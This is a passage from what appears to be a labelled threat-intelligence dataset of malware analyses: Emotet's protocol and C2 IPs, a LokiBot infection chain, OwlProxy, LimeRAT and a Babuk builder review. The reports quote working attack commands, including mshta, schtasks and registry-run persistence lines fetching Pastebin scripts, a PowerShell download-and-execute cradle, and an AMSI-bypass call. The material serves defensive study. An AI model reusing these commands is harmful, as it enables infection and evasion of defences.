for Emotet\u2019s communication protocol adds the client command opcode and a SHA-256 hash of the L1 data.\nThis information is prepended to L1.\nThe following structure can be observed for L2:\n```\nstruct layer\\\\_2\\\\_packet\n{\nuint32\\\\_t cmd\\\\_id;\nuint32\\\\_t hash\\\\_size; // 0x20\nuint8\\\\_t data\\\\_hash[0x20]; // SHA-256 hash of Plaintext packet\nuint32\\\\_t data\\\\_size; // Plaintext packet size\nuint8\\\\_t data[data\\\\_size]; // Plaintext packet\n}\n```\nThe following table shows the cmd\\\\_ids that have been observed:\n| **Command ID (decimal)** | **Command ID (hex)** | **Description** |\n| 1 | 0x01 | Initial victim check-in packet |\n| 1000 | 0x3E8 | Proclist check-in packet |\n**Protocol Changes: L3**\nL3 for Emotet\u2019s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.\nThe following structure can be observed for L3:\n```\nstruct L3\\\\_packet\n{\nuint8\\\\_t enc\\\\_secret\\\\_key[0x40]; // ECDH key\nuint8\\\\_t encrypted\\\\_data[];\nuint8\\\\_t random\\\\_data[]; // Random data generated using BCryptGenRandom function\n}\n```\nThe randomly generated data has some interesting formatting performed on it that first replaces all nulls with `0xC3`.\nIt then selects a random integer between zero and 14 and writes `0x00`to the offset of that integer.\n**Loader command table changes**\nIn addition to protocol changes, Intel 471 analysts also observed changes to the new Emotet command table.\nThis table handles module/binary execution and has the following opcodes:\n| **Opcode** | **Command name** | **Description** |\n| 1 | Update binary | Drops and starts binary after extracting modlist/drop directory and appending to command line as base64.\n|\n| 2 | Load Module | Injects a module into memory.\n|\n| 3 | Execute EXE | Drops and executes executable.\n|\n| 4 | Execute EXE as user | Drops and executes executable as a specific user.\n|\n| 5 | Inject DLL with export | Injects a DLL into memory and maps and executes the export DllRegisterServer.\n|\n| 6 | Execute dll with `regsvr32[.]exe` | Drops and executes DLL with `\u201cregsvr32[.]exe -s .\u201d`\n|\n| 7 | Execute dll with `rundll32[.]exe` | Drops and executes DLL with `\u201crundll32[.]exe , Control\\_RunDLL.\u201d`\n|\nThe update to the loader\u2019s command table gives Emotet much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family.\nIn the course of investigating the code, Intel 471 found two new distinct Emotet botnets.\nWe are categorizing them as:\n* Epoch4\n* Epoch5\nAdditionally, prior to Emotet\u2019s takedown, it had the following distinct botnets:\n* Epoch1\n* Epoch2\n* Epoch3\nThe following IPs are currently observed in use for Epoch 4:\n* hxxps://103.8.26.103:8080\n* hxxps://212.237.17.99:8080\n* hxxps://216.158.226.206:443\n* hxxps://41.76.108.46:8080\n* hxxps://50.116.54.215:443\n* hxxps://210.57.217.132:8080\n* hxxps://103.8.26.102:8080\n* hxxps://138.185.72.26:8080\n* hxxps://178.79.147.66:8080\n* hxxps://91.200.186.228:443\n* hxxps://58.227.42.236:80\n* hxxps://107.182.225.142:8080\n* hxxps://212.237.5.209:443\n* hxxps://195.154.133.20:443\n* hxxps://110.232.117.186:8080\n* hxxps://191.252.196.221:8080\n* hxxps://185.184.25.237:8080\n* hxxps://81.0.236.90:443\n* hxxps://188.165.214.166:7080\n* hxxps://212.237.56.116:7080\n* hxxps://45.142.114.231:8080\n* hxxps://104.251.214.46:8080\n* hxxps://176.104.106.96:8080\n* hxxps://158.69.222.101:443\n* hxxps://51.68.175.8:8080\n* hxxps://45.118.135.203:7080\n* hxxps://207.38.84.195:8080\n* hxxps://103.75.201.2:443\nThe following IPs are currently observed in use for Epoch 5:\n* hxxps://85.214.67.203:8080\n* hxxps://51.178.61.60:443\n* hxxps://66.42.57.149:443\n* hxxps://45.79.33.48:8080\n* hxxps://54.38.242.185:443\n* hxxps://191.252.103.16:80\n* hxxps://196.44.98.190:8080\n* hxxps://185.148.169.10:8080\n* hxxps://142.4.219.173:8080\n* hxxps://207.148.81.119:8080\n* hxxps://177.72.80.14:7080\n* hxxps://51.210.242.234:8080\n* hxxps://37.59.209.141:8080\n* hxxps://168.197.250.14:80\n* hxxps://54.37.228.122:443\n* hxxps://195.77.239.39:8080\n* hxxps://78.46.73.125:443\n* hxxps://37.44.244.177:8080\n* hxxps://195.154.146.35:443\n* hxxps://78.47.204.80:443\n**What we suggest for remediation**\nAs Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation.\nDuring the email/maldoc stage, one such method for detection is user awareness regarding the lure template Emotet uses.\nThe red box template in Image 2 is standard for Emotet documents.\nIf that fails, defenders can look for instances where PowerShell is spawned from Microsoft Word or Excel sheets and subsequently opens `rundll32[.]exe` to execute a DLL.\nWhile Emotet typically uses the export \u201cControl\\\\_RunDLL,\u201d looking for instances that do not use that export still would be a good idea, since this behavior is unusual in non-malicious settings.\nAs Emotet creates both a run key and a service during install, defenders can watch for any suspicious services created, especially if the process the service launched originates from `%LOCALAPPDATA%`.\nAdditionally, during various command executions, defenders can look for the following command lines to detect Emotet when it executes binaries.\nHowever, Emotet will have installed at this point and a full investigation will be needed:\n* `Regsvr32[.]exe -s `\n+ Look for the execution of DLLs dropped to `%temp%`.\n* `Rundll32[.]exe , Control\\_RunDLL`\n+ Look for the execution of DLLs dropped to `%temp%`.", "mitre_ids": ["S0367", "S0367", "S0367", "S0367", "T1573", "S0367", "S0367", "TA0010", "T1566", "TA0006", "T1114", "T1114", "T1606", "T1189", "TA0008", "T1110", "S0367", "T1566", "S0367", "S0367", "T1566", "S0367", "S0367", "T1059", "S0367", "T1059", "T1059", "S0367", "S0367", "T1059", "T1059", "T1566", "T1059", "T1059", "T1059", "S0367", "T1059", "T1218", "S0367", "S0367", "T1218", "S0367", "T1027", "S0367", "S0367", "T1573", "T1573", "S0367", "T1573", "T1573", "S0367", "S0367", "TA0011", "TA0011", "TA0011", "TA0011", "T1573", "S0367", "TA0011", "TA0011", "TA0011", "T1057", "T1041", "S0367", "T1057", "S0367", "S0367", "S0367", "TA0011", "TA0011", "TA0011", "T1057", "TA0010", "S0367", "TA0011", "TA0010", "TA0011", "S0367", "S0367", "T1573", "T1573", "T1001", "S0367", "T1055", "TA0002", "TA0002", "TA0002", "TA0002", "TA0002", "T1055", "T1055", "TA0002", "T1218", "T1218", "TA0002", "T1218", "T1218", "S0367", "S0367", "S0367", "S0367", "S0367", "S0367", "T1566", "S0367", "T1059", "T1059", "T1059", "T1218", "S0367", "S0367", "S0367", "TA0002", "TA0002", "S0367", "T1218", "T1218"], "anno_name_label": [["TECHNIQUE", "Command and Scripting Interpreter: Unix Shell"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI"]}, {"cti_report": "A twisted malware infection chain\nAugust 26, 2020\nRecently, a malware dropper received by mail has caught our attention as we have detected different samples sent to multiple targets in Spain, Portugal, Italy and Norway, although it has probably reached many more European countries.\nFirstly, it is characteristic that it lands on the victim in PPT format, while it has been much more common to find DOC or XLS extensions being used for this purpose.\nThe document has no content, but when you close the PPT viewer, the following window shows up:\n![](https://lab52.io/blog/wp-content/uploads/2020/08/1.png)\nThis window is generated by the macros contained in the On\\_Close function, which is executed when you close the document, instead of when oppened, thus preventing macros from being executed in many sandbox solutions.\nThis macro have the following slightly obfuscated code:\n![](https://lab52.io/blog/wp-content/uploads/2020/08/2.png)\nNote that, before the \u201cMsgBox\u201d, it executes \u201cShell\u201d with two concatenated variables.\nIf we look at the content of those two variables, we can see that they contain the following string: \u201cmshta.exe https://j.]mp/kasasjdoopoopasdskdd\u201d, which causes the legitimate Windows interpreter \u201cmshta\u201d to execute a script hosted on the web that follows.\nIn fact, this address only redirects to the following link in Pastebin: https://pastebin.com/mqRZ7CBC, which contains the following obfuscated script:\n![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-26-12-55-21.png)\nAfter cleaning up the script a bit, we can see that it triggers the execution of the following commands:\n| \u2018id1run mshta.exe \u201chttps://pastebin.com\\raw\\ZnhyvWAU\u201drun schtasks.exe \u201cC:\\Windows\\System32\\schtasks.exe\u201d /create /sc MINUTE /mo 60 /tn \u201cxesefiliym\u201d /tr \u201cmshta.exe \u201chttps://pastebin.com\\raw\\ZnhyvWAU\u201d /F\u2018id2run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\trats2di => mshta.exe \u201chttps://pastebin.com\\raw\\d7kxMSZd\u201d\u2018id3run reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ => mshta.exe \u201chttps://pastebin.com\\raw\\VJDyrCD2\u201d\u2018defidrun mshta.exe \u201chttps://pastebin.com\\raw\\9dva5i24\u201drun reg add HKCU\\\\Software\\\\Microsoft\\\\Windows notepad\\\\CurrentVersion\\\\Run\\\\rednefed => mshta.exe \u201chttps://pastebin.com\\raw\\9dva5i24\u201d |\nBasically, the script consists of the execution of two other Pastebin mshta scripts, and the creation of persistence of these two, plus another two extra in the registry and in the programmed tasks of the system, causing that in each reboot, there are 4 scripts being downloaded from Pastebin and executed on the computer.\nThe execution of each of the 4 scripts is preceded by one of the following identifiers \u201c**id1**, **id2**, **id3** and **defid**\u201c.\nSince the script executed by **id1** is the most complex, we will leave it for the end of the post and we will focus first on the other 3 in order of complexity.\n**id3** does not run anything, probably the author who is using this dropper did not need it and left it free, pointing to the next script hosted in Pastebin:\n| <script language=\u201d&#86;&#66;&#83;&#99;&#114;&#105;&#112;&#116;\u201d>self.close</script> |\n**id2** consists of a small script in powershell, which runs on every reboot and stays in a loop checking everything copied to the Windows clipboard.\nIn case that the copied string is a Bitcoin address, it replaces it with the attacker\u2019s Bitcoin address, in order to make the user deposit money into the actor\u2019s account:\nIn this case, although the script is capable of storing up to four bitcoin addresses, the script only has one repeated four times (19kCcdbttTAX1mLU3Hk9S2BW5cKLFD1z1W), from which has been possible to identify different sources that did not have much activity:\n![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-24-15-07-54.png)\n**Defid**, on the other hand, points to another script, which downloads from Pastebin a base64 encoded file, which has been inverted and where the \u201c0\u201d characters have been replaced by the \u201c.character in order to make its analysis more difficult:\n![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-40-14.png)\nAfter sorting and decoding it, we obtain a small executable developed in .Net and without obfuscation whose only purpose is to drop in the system a .vbs file that disables a large number of system security policies, including those of Windows Defender and MS Office.\n* ![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-46-35-1-1024x295.png)\nFinally, the script executed by **id1** after being cleaned up a bit, contains the following relevant commands:\nThis script, first of all leaves some kind words for the analyst who is reviewing the execution flow of this threat, and informs us that he would like to change it\u2019s job :).\nIn terms of capabilities, mainly what it does is download two other executables developed in .Net with obfuscation techniques similar to those of the \u201c**Defid**\u201d executable.\nOnce downloaded and deobfuscated, it loads them with \u201c[System.Reflection.Assembly]::Load(XXX)\u201d which allows him to directly call functions within these binaries from PowerShell.\nThe call to the first binary loaded, is as follows\n| $blind=[System.Reflection.Assembly]::Load($deblindB)[Amsi]::Bypass() |\nThe name of the funcion and class being called gives clues of its purpose.\nThe binary is obfuscated with ConfuserEx, therefore using some tool for the analysis, such as \u201cde4dot-cex\u201d, can make easier to analyze its content.\n![](https://lab52.io/blog/wp-content/uploads/2020/08/Captura-de-pantalla-de-2020-08-25-14-54-27-1024x419.png)\nIt consists of a DLL that does what it promises, since it bypasses AMSI to avoid detection using a version practically identical to this technique \u201chttps://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell\u201d.\nAfter this, it downloads **a third executable** from Pastebin, decodes it and stores it in a variable that it calls $Cli2 and loads the second executable, also in .Net, and calls its function \u201cChris()\u201d passing as parameters the string \u201cnotepad.exe\u201d and the variable that contains the third executable.\nThis second binary just loaded, after being analyzed in the same way as the AMSI Bypass DLL, is used to inject in a **non** .Net executable inside another process that is not .Net either.\nThat is, it creates a legitimate notepad process, and injects into it the third binary it has downloaded.\nThis last binary, consists of a sample of the Bot/Stealer LokiBot, practically unpacked, which at this point, is in a system without most of its protection measures.\nIt is interesting that, up to this point, this campaign coincides in many points with [the following report](https://isc.sans.edu/forums/diary/AgentTesla+Delivered+via+a+Malicious+PowerPoint+AddIn/26162) related to an AgentTesla infection campaign, but as in this case, the final threat is not developed in .Net, they have had to add this last extra loader, in order to inject malware developed in other languages, in other processes.\nThe sample command and control server is \u201chttp://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM\u201d and although its main function is to act as a stealer, as it focuses on stealing credentials from all types of mail clients, FTP, browsers and many other services, it also acts as a bot, allowing some control over the computer by the actor behind this threat.\nIOCs\n| http://195.69.140.]147/.op/cr.php/Gi4uJRts3jTJM |\n| https://j.mp/kasasjdoopoopasdskdd |\n| https://pastebin.com/raw/ZnhyvWAU |\n| https://pastebin.com/raw/d7kxMSZd |\n| https://pastebin.com/raw/VJDyrCD2 |\n| https://pastebin.com/raw/9dva5i24 |\n| https://pastebin.com/raw/n9Zadz2P |\n| https://pastebin.com/raw/XCXpMvQC |\n| https://pastebin.com/raw/UTLkgL5Y |", "mitre_ids": ["T1566", "T1566", "T1204", "T1059", "T1497", "T1204", "T1027", "T1059", "T1218", "T1027", "T1053", "T1053", "T1218", "T1547", "T1059", "T1059", "T1059", "T1547", "T1115", "T1115", "T1027", "T1105", "TA0005", "T1140", "T1562", "T1105", "T1059", "T1620", "T1105", "T1140", "T1105", "T1055", "T1055", "S0447", "S0331", "S0331", "T1055", "T1041", "T1055", "T1555"], "anno_name_label": [], "cti_entity_class": ["CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI"]}, {"cti_report": "Updates on OwlProxy malware\nApril 29, 2021\nDuring the analysis of some malicious artifacts collected from an incident, we have recently detected a sample that has caught our attention, the sample was deployed on a server exposed to the Internet and was packed with \u201cVMProtect\u201d.\nAfter analyzing this malware sample we could see that it was a recent version of a tool known as OwlProxy, which has been detected on targets hit by the APT group known as Chimera.\nThe use of \u201cVMProtect\u201d by the actors makes the analysis of their code more time-consuming (although it simplifies its detection since this is already an anomaly by itself).\nOn the other hand, this packer has some weaknesses such as the fact that it does not always protect part of the binary metadata and that once in memory, it does not obfuscate most of the strings, which makes these elements of the executable relatively easy to analyze once in memory.\nEspecially for this sample it helps for its identification given the amount of quite unique strings it contains.\nAn example of this is the fact that in static you can see how it still contains the string with the original name of the binary (iisdll.dll).\nFrom some of these strings, it can be seen how new samples are being uploaded regularly, which after a more detailed analysis have been identified as different 32-bit and 64-bit versions of the same threat, some of them packaged and others not.\n![](https://lab52.io/blog/wp-content/uploads/2021/04/asd2-1024x308.png)\n![](https://lab52.io/blog/wp-content/uploads/2021/04/asd3.png)\nSome of them, dating from 2019, largely coincide with the samples analyzed in the following [CyCraft](https://cybernews.com/security/taiwan-government-targeted-by-multiple-cyberattacks-owlproxy-malware/)\nA summary of its capabilities can be found in this report, which explains that it acts as a proxy between the DMZ of the victim\u2019s infrastructure and its internal network and also allows the execution of commands remotely.\nThe report shows the metadata of the binary where you can see how the PDB matches with most of the more recent samples that can be found in Virustotal.\n![](https://lab52.io/blog/wp-content/uploads/2021/04/asd4.png)\nIt is also explained in the report that the sample puts its persistence as a Service and highlights the two endpoints it exposes while it is running.\nIn the case of the samples analyzed, instead of using port 80, they are exposing the port 443 using SSL and they have stopped using the string \u201cservlet\u201d and now they have different strings depending on the sample in question, they have kept the string \u201cpp\u201d for the endpoint that acts as proxy.\nTwo samples from 02/2019\nDEE3A502AEDCBE109373AA200A690D4E2D1A10FA3CF69A7B6DB68A78C6ABFC2C\n| https://+:443/HelpTheme/ | Remote CMD addr |\n| https://+:443/HelpTheme/pp/ | Proxy addr |\n| FastUserSwitchingCompatibility | Service Name |\n75E616BF87AD0CBE738C4C48BC0ECD114871DEF145E21545FA11705D3A11D60E\n| https://+:443/topics/ | Remote CMD addr |\n| https://+:443/topics/pp/ | Proxy addr |\n| wmipd  | Service Name |\nAlong with these two samples, there are 3 more recent ones (July 2020).\nTwo of them are newer versions of this same 32-bit and 64-bit tool and the third one is an installer or dropper (9A9FFDB8FC20B6E6E6E5A1DE434F6B834E69755FD62157F91884E9A681F0073256) that when executed, depending on the operating system architecture, extracts from its resources a suitable OwlProxy sample for the architecture in question, installs it in system32 with the name \u201cwmipd.dll\u201d, gives it the same creation and modification date as \u201ccalc.exe\u201d and creates a service named wmipd that runs it at every system startup.\nThe pdb of this dropper keeps the string \u201cowl\u201d in its path, so we have named it OwlInstaller.\n\u201cf:\\project\\owl\\isapi\\win32\\release\\iisinstaller.pdb\u201d.\nThe OwlProxy sample of its resources is split into reverse ordered blocks, so the MZ header, for example, is in the last 2634 bytes of the file.\nOnce extracted and installed, these more recent samples have many strings and use OutputDebugString in several occasions, which causes that in debugging or using DebugView a few of this strings can be seen as debug information:\n![](https://lab52.io/blog/wp-content/uploads/2021/04/asd5.png)\nAlong with the fact that these also use \u201chttps\u201d as protocol, and that they have again changed part of the path of their endpoints to use \u201cexchangetopicservices\u201d (probable evolution of the 2019 samples that use the string \u201ctopics\u201d), they have added a new endpoint to the tool, as follows:\n| https://+:443/exchangetopicservices/ | Remote CMD addr |\n| https://+:443/exchangetopicservices/pp/ | Proxy |\n| https://+:443/exchangetopicservices/px/ | Webshell |\nThe path ending in \u201cexchangetopicservices\u201d still works the same way as in previous samples, executing commands in a cmd process through unnamed pipes.\nThe proxy endpoint has also remained the same in terms of capabilities.\nFinally, thanks to all the strings in the binary, it is easy to spot that they call this endpoint \u201cWebshell\\_run\u201d, whose URI ends in \u201c/px/\u201d, and consists of a function that adds the following list of commands:\n* get\\_driver\n* get\\_directory\n* upload\\_file\n* do***nw***load\\_file\nThis area has many more strings than the rest, and it is curious that several of them are misspelled.\nIn fact the first error probably comes in the command \u201cget\\_driver\u201d since in its internal logic the only thing it does is to list the hard disks installed in the computer:\n![](https://lab52.io/blog/wp-content/uploads/2021/04/asd6-1.png)\nWhich suggests that probably, this functionality should be called \u201cget\\_drives\u201d :\\_)\nThe next wrong command is \u201cdo**nw**load\\_file\u201d, although in this case it\u2019s easy to guess what it means and it does exactly that, it allows the attacker to download a file from the compromised server.\n![](https://lab52.io/blog/wp-content/uploads/2021/04/asd7.png)\nThe rest do match their names since \u201cget\\_directory\u201d can be used to list the contents of a directory and \u201cupload\\_file\u201d is used to drop a file on the remote server.\nThe last notable error we have detected is a translation error when a file does not exist in the \u201cget\\_directory\u201d command.\n![](https://lab52.io/blog/wp-content/uploads/2021/04/asd8-1.png)\nThe older versions have much fewer strings, so it is likely that in future versions of the threat will remove many of those described in this post, but some of them are used to identify the command executed, so it is possible that they will remain, along with the pdb that they have been leaving since 2019.\nWhat is clear is that they are in constant development.\n| DEE3A502AEDCBE109373AA200A690D4E2D1A10FA3CF69A7B6DB68A78C6ABFC2C | Old OwlProxy x64 version |\n| 75E616BF87AD0CBE738C4C48BC0ECD114871DEF145E21545FA11705D3A11D60E | Old OwlProxy x64 version |\n| 16CF6924ECA8208AD9D9B8470CF0A849995ED4D981D5BC706E62AE878EF261BB | Recent OwlProxy x86 version |\n| C9B8CFACC859E494984AE9DDF864314AF651FD32E60F33C7F42BFC640620E8CA | Recent OwlProxy x64 version |\n| 95E7E09468F7DC62DA42E036B6E36CE27DC04C2CA0BB86A2FED39B3CC2BF4A97 | VMProtect OwlProxy x64 version |\n| 9A9FFDB8FC20B6E6E5A1DE434F6B834E69755FD62157F91884E9A681F0073256 | OwlInstaller |", "mitre_ids": ["T1027", "G0114", "T1027", "T1027", "T1027", "TA0011", "T1071", "T1036", "T1547", "T1547", "T1059", "T1083"], "anno_name_label": [["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"], ["MALWARE", "OwlProxy"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Literature lover targeting Colombia with LimeRAT\nMay 17, 2021\nIn the middle of the current brouhaha in Colombia, besides the intense hacktivism activity, some actors might be trying to take their move.\nSeveral campaigns aimed to Colombia have been detected, but today we will talk about one with a couple interesting details in their kill chain.\nThis actor is starting the infection via email with very generic topics such as subpoenas or bank payments, with a crafted html view where the icon pretending to be an attachment is in fact an image with a link to download a compressed file from One Drive.\n![](https://lab52.io/blog/wp-content/uploads/2021/05/phichin-1024x506.png)Phishing emails serving same malicious sample\nThe .rar file contains a Visual Basic Script with same name \u201ccitacion juzgado.vbs\u201d which, poorly obfuscated, will create a Windows Script Host Shell Object to download and execute a new Powershell script by executing the following command:\n\u201cC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u201d I`E`X((n`e`W`-Obj`E`c`T((\u2018Net.Webclient\u2019))).((\u2018Downloadstri\u2019+\u2019ng\u2019)).InVokE(((\u2018https://ia601509.us.archive.org/20/items/3\\_20210512\\_20210512\\_1430/3.txt\u2019))))\nThe interesting fact about this first stage is that this element is being downloaded from The Internet Archive, where you can take snapshots of websites, or upload \u201cantique\u201d files, so they keep being accessible after the website disappears from the ordinary internet at their original hosting site.\nWe are starting to witness how attackers are using legitimate domains such as discord or twitter, to download some malicious payload, or even legitimate cloud services such as One Drive or DropBox to host different samples.\nHowever, using The Internet Archive could be considered witty, and not-so-much seen in the wild so far.\n![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-13-16-46-32-1.png)\n*Opendir in The Internet Archive*\nBasically, this Powershell script will download a series of other different scripts which will be dropped in \u201cC:\\Users\\Public\\\u201d and \u201cC:\\ProgramData\\Microsoft Arts\\Start\\\u201d, and establish persistence using the Registry Key \u201cHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\u201d.\n![](https://lab52.io/blog/wp-content/uploads/2021/05/chain-1-1024x629.png)\nInfection Chain Among these different scripts, most of them trying to disable typical AntiVirus solutions, there is one implementing a technique a little more advanced than the rest of the techniques, known as Reflection Assembly, and consisting of the creation of binary payloads as byte arrays in Powershell and then loading them using a puppet process injection within the memory of process \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe\u201d as shown in the following screenshot, or in \u201cC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\u201d, depending on the results of some previous checks.\n![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-09-39-46-1024x60.png)Reflected Assembly Process injection\nAfter dumping this binary content into respective files, we could identify two Dynamic Libraries written in .NET, one of them used as a loader for the other, which happens to be the final malicious Remote Access Trojan (RAT).\nAccording to [360 Total Security researchers](https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/), some similar techniques were spotted loading a Delphi version of the njRAT in July 2020, by what it seemed to be an Arabic speaker actor.\nEven though in both cases the binary files have resulted in Dynamic Libraries and same loading technique, in this occasion both binaries were identified as written in .NET. Furthermore, the RAT used in this scenario was Lime-RAT, a modified version of njRAT.\nWhen taking a closer look at the final stage in order to identify the final Command and Control server, we found another interesting element.\nThis actor chose the domain \u201csantiagonasar.]duckdns.org\u201d, which is actually the name of the main character of Chronicle of a Death Foretold (Cr\u00f3nica de una muerte anunciada), a great novel written by Gabriel Garc\u00eda M\u00e1rquez, Colombian writer.\nBut the passion for literature of our friends was not only reflected in the domain name, but also in the chosen port: 1984.\nAlthough the aforementioned book was published in 1983, our first impression was to think of this name as a reference to the novel written by George Orwell, named \u201c1984\u201d.\nDespite having seen the string \u201cALOSH\u201d repetitively through the different stages, suggesting that this could be an individual going by this nickname, it is worth mentioning the fact that the APT group referred as APT-C-36, or Blind Eagle, have been spotted many times using this same toolset including LimeRAT, targeting same geographic area through phishing emails written in perfect Spanish, and also using Duckdns as part of their infrastructure.\nAfter a quick research on previous DNS resolutions of the final C2, we could identify related documents contacting the same IP, referring to Colombia and the use of the word \u201cCacha\u201d, which could be a way of saying \u201cfriend\u201d or \u201cbrother\u201d in Colombia, among other meanings in Spanish.\nThese relations, added to the Spanish literary culture, would clearly indicate a focus in Colombia.\n![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-16-18-35.png)\nPrevious domains resolving to same IP\n![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-14-16-32-41-1024x106.png)\nDifferent execution parents\nLastly, after another quick search on different binary executables contacting this same C2, we found different forms of packed malware samples using strings in Asian and Cyrillic encoding, with a noisier obfuscation.\nAbout these samples, we noticed that the attacker could have been only rotating the contacted port (4433, 1986, 2000) which could be enough to mislead an automated sandbox identifying the host as dead.\nThe cached analysis in shodan.io would also show that the server might only have one port open at a time, which would support the idea of the attacker rotating ports for every campaign while reusing same C2 infrastructure.\n![](https://lab52.io/blog/wp-content/uploads/2021/05/Screenshot-from-2021-05-17-12-47-44.png)\nC2 check in shodan.io\nIOCs\n| 0d7abdd154b96c36680719ef15d81c64a0a12276a5d1ec8d9ec0bffd45545d6 |  |\n| ff525bc3aade928db718dab395eeba0f886054c889dda2389a51628d58924ff5 |  |\n| 0a9a1e043d8138bb8fb257f07ac80c0fb8287eec1c131efff3a4302b13ec78c3 |  |\n| https://onedrive.live.]com/download?cid=A4F059D1DE692167&resid=A4F059D1DE692167%21107&authkey=AOG1a9Z-hUIFbhI |  |\n| https://nyc008.hawkhost.]com/~invoixec/ |  |\n| https://ia601509.us.archive.]org/20/items/3\\_20210512\\_20210512\\_1430/3.txt |  |\n| https://ia601509.us.archive.]org/28/items/1\\_20210512\\_20210512\\_1427/1.txt |  |\n| santiagonasar.]duckdns.org |  |\n| santiagonasar2.]duckdns.org |  |\n| cachanuevo.]duckdns.org |  |\n| 2021cacha.]duckdns.org |  |\n| enviocacha.]duckdns.org |  |\n| sosht.]duckdns.org |  |\n| 172.96.187.2 |  |\n| 181.141.0.30 |  |\nReferences\n<https://twitter.com/1ZRR4H/status/1392789216141004802>\n<https://blog.360totalsecurity.com/en/new-infection-chain-of-njrat-variant/>", "mitre_ids": ["T1566", "T1566", "T1566", "T1059", "T1027", "T1059", "T1105", "T1105", "T1105", "T1547", "T1105", "T1562", "T1055", "S0385", "S0385", "TA0011", "G0099", "G0099", "T1566", "TA0011", "TA0011", "T1027", "T1027", "TA0011", "TA0011"], "anno_name_label": [["MALWARE", "LimeRAT"], ["MALWARE", "LimeRAT"], ["MALWARE", "LimeRAT"]], "cti_entity_class": ["CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Quick review of Babuk ransomware builder\nJuly 05, 2021\nLast week, the builder for the Babuk ransomware family was leaked online.\nLab52 has obtained and analyzed this builder sample determining that it is very likely to be authentic.\nAfter their recent official move from Ransomware as a Service to data leaks extortions, someone uploaded to [virusTotal](https://www.virustotal.com/gui/file/82e560a078cd7bb4472d5af832a04c4bc8f1001bac97b1574efe9863d3f66550) the ransomware builder for unknown reasons, and it was soon identified as such by British researcher [Kevin Beaumont](https://twitter.com/GossiTheDog/status/1409121823376117772).\n![](https://lab52.io/blog/wp-content/uploads/2021/07/01-1.png)\nContent of Babuk builder leak\nWhat we first find is builder.exe, along with 2 other Windows executable files with .bin extension, 4 different Unix executables, and note.txt.\nAt a first test, we could see how we have to tell builder.exe the output folder as an argument, and we noticed that the files generated were similar to the builder folder files.\n![](https://lab52.io/blog/wp-content/uploads/2021/07/02.png)\nBabuk builder usage\n![](https://lab52.io/blog/wp-content/uploads/2021/07/03-1.png)\nBabuk builder output\nAfter the successful execution, we get the two eliptic curve keys generated for encryption, 3 encryption executables for Windows, ARM-based NAS decives, and VMWare ESXi servers respectively, together with its corresponding decryption executables.\nOne interesting thing that we found after these firsts test was that builder.exe would look for its files in the folder from where it is called, causing an error in case we want to execute builder.exe with an absolute path from a different location, which could be considered a bug or, at least, a not so much elegant implementation.\n![](https://lab52.io/blog/wp-content/uploads/2021/07/04.png)\nBabuk builder path bug\nWe decided to compare the Windows crypter executable with real samples uploaded to public sandboxes, and we could first see useful information that was already suggesting that the builder could indeed be authentic.\n![](https://lab52.io/blog/wp-content/uploads/2021/07/050-1024x397.png)Comparison *between real Babuk sample and built sample*\nWe also compared the encryption timing between two samples, getting similar times, which would be a reinforcement about its authenticity since Babuk is Top 3 fastest [ransomware encryption speed](https://twitter.com/CryptoInsane/status/1408342272438005762/photo/2) since they updated their efficiency \u201cflaws\u201d identified by 